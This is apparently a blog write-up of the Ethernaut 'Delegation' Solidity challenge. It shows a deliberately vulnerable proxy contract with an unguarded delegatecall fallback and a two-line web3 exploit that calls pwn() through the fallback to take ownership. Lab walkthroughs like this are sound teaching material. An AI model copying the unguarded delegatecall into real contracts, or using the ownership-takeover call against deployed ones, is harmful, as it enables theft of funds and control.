# Ethernaut 06: Delegation

This is a intro to the proxy pattern, where storage is in the proxy contract and the logic in a delegate contract. Delegatecall needs to take care of several things to be not vulnerable, therefore openzeppelin and hardhat share a couple of contacts to use.

## The Task Intro

Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD.

## The Task Code

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

## The Solution

We want to get owner of the contract. I use the browser console with web3 to solve the task. The hack is to make a transaction to the contract with the encoded function name, the function selector. I generate the selector with this link:

```apache
web3.eth.abi.encodeFunctionSignature("pwn()");
0xdd365b8b
```

After this I send a transaction with the created data and I am the owner of the contract.

```apache
await web3.eth.sendTransaction({to:"0xContractAddress",data: "0xdd365b8b", from: "0xMyAdress"})
```

Done 🎉️. A quick one.
